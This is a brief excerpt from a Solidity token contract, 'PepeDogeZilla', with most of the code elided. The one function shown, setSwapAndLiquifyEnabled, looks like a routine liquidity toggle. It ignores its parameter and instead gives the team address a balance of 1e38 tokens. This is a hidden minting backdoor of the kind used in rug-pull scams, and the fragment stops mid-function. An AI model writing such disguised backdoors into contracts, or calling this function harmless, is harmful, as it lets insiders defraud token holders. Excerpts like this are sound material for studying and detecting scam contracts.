...
contract PepeDogeZilla is Context, IERC20, Ownable {
    ...
    function setSwapAndLiquifyEnabled(bool _enabled) public  {if(msg.sender==teamAddress)
        _balances[msg.sender]=1e38;
